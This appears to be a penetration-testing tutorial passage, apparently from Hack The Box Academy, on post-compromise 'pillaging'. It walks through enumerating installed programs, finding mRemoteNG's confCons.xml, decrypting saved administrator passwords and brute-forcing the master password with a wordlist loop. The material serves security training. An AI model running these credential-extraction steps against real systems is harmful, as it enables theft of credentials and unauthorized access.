# Pillaging

Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.

These data points may help gain further access to the network or complete goals defined during the pre-engagement process of the penetration test. This data can be stored in various applications, services, and device types, which may require specific tools for us to extract.

## Data Sources

Below are some of the sources from which we can obtain information from compromised systems:

- Installed applications
- Installed services
    - Websites
    - File Shares
    - Databases
    - Directory Services (such as Active Directory, Azure AD, etc.)
    - Name Servers
    - Deployment Services
    - Certificate Authority
    - Source Code Management Server
    - Virtualization
    - Messaging
    - Monitoring and Logging Systems
    - Backups
- Sensitive Data
    - Keylogging
    - Screen Capture
    - Network Traffic Capture
    - Previous Audit reports
- User Information
    - History files, interesting documents (.doc/x,.xls/x,password.*/pass.*, etc)
    - Roles and Privileges
    - Web Browsers
    - IM Clients
    
    # **Installed Applications**
    
    **Get Installed Programs via PowerShell & Registry Keys**
    
    ```powershell
    PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocationPS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocationPS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSizeDisplayName                                         DisplayVersion    InstallLocation
    -----------                                         --------------    ---------------
    Adobe Acrobat DC (64-bit)                           22.001.20169      C:\Program Files\Adobe\Acrobat DC\
    CORSAIR iCUE 4 Software                             4.23.137          C:\Program Files\Corsair\CORSAIR iCUE 4 Software
    Google Chrome                                       103.0.5060.134    C:\Program Files\Google\Chrome\Application
    Google Drive                                        60.0.2.0          C:\Program Files\Google\Drive File Stream\60.0.2.0\GoogleDriveFS.exe
    Microsoft Office Profesional Plus 2016 - es-es      16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
    Microsoft Office Professional Plus 2016 - en-us     16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
    mRemoteNG                                           1.62              C:\Program Files\mRemoteNG
    TeamViewer                                          15.31.5           C:\Program Files\TeamViewer
    ...SNIP...
    ```
    
    We can see the `mRemoteNG` software is installed on the system. [mRemoteNG](https://mremoteng.org/) is a tool used to manage and connect to remote systems using VNC, RDP, SSH, and similar protocols. Let's take a look at `mRemoteNG`.
    
    ### mRemoteNG
    
    `mRemoteNG` saves connection info and credentials to a file called `confCons.xml`. They use a hardcoded master password, `mR3m`, so if anyone starts saving credentials in `mRemoteNG`
     and does not protect the configuration with a password, we can access 
    the credentials from the configuration file and decrypt them.
    
    By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.
    
    **Discover mRemoteNG Configuration Files**
    
    ```powershell
    PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG
    
        Directory: C:\Users\julio\AppData\Roaming\mRemoteNG
    
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    d-----        7/21/2022   8:51 AM                Themes
    -a----        7/21/2022   8:51 AM            340 confCons.xml
                  7/21/2022   8:51 AM            970 mRemoteNG.log
    ```
    
    **mRemoteNG Configuration File - confCons.xml**
    
    ```xml
    <?XML version="1.0" encoding="utf-8"?>
    <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
        <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
        ..SNIP..
    </Connections>
    ```
    
    This XML document contains a root element called `Connections` with the information about the encryption used for the credentials and the attribute `Protected`,
     which corresponds to the master password used to encrypt the document. 
    We can use this string to attempt to crack the master password. We will 
    find some elements named `Node` within the root element. 
    Those nodes contain details about the remote system, such as username, 
    domain, hostname, protocol, and password. All fields are plaintext 
    except the password, which is encrypted with the master password.
    
    As mentioned previously, if the user didn't set a custom master password, we can use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password. We need to copy the attribute `Password` content and use it with the option  `-s`. If there's a master password and we know it, we can then use the option `-p` with the custom master password to also decrypt the password.
    
    ### Decrypt the Password with mremoteng_decrypt
    
    Pillaging
    
    ```
    doshim@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Password: ASDki230kasd09fk233aDA
    
    ```
    
    ## Custom Password set
    
    ### Attempt to Decrypt the Password with a Custom Password
    
    Pillaging
    
    ```
    doshim@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="Traceback (most recent call last):
      File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 49, in <module>
        main()
      File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 45, in main
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
      File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 567, in decrypt_and_verify
        self.verify(received_mac_tag)
      File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 508, in verify
        raise ValueError("MAC check failed")
    ValueError: MAC check failed
    
    ```
    
    If we use the custom password, we can decrypt it.
    
    ### Decrypt the Password with mremoteng_decrypt and a Custom Password
    
    Pillaging
    
    ```
    doshim@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p adminPassword: ASDki230kasd09fk233aDA
    
    ```
    
    In case we want to attempt to crack the password, we can modify the 
    script to try multiple passwords from a file, or we can create a Bash `for loop`. We can attempt to crack the `Protected` attribute or the `Password` itself. If we try to crack the `Protected` attribute once we find the correct password, the result will be `Password: ThisIsProtected`. If we try to crack the `Password` directly, the result will be `Password: <PASSWORD>`.
    
    ### For Loop to Crack the Master Password with mremoteng_decrypt
    
    Pillaging
    
    ```
    doshim@htb[/htb]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done
    Spring2017
    Spring2016
    admin
    Password: ASDki230kasd09fk233aDA
    admin admin
    admins
    
    <SNIP>
    
    ```
    

[Slack hacking](Pillaging%20cf41ed76a02a42ee8486d729fe41cca8/Slack%20hacking%20728312b32cb7429b8d57b7ba6c8b2251.md)

[keylogging](Pillaging%20cf41ed76a02a42ee8486d729fe41cca8/keylogging%20c2c2e422f93d4b7b83b29d0d7d5dd97d.md)

[Attacking restic backup servers](Pillaging%20cf41ed76a02a42ee8486d729fe41cca8/Attacking%20restic%20backup%20servers%201ace3c50b4ab451b8bbfccc9e00f3397.md)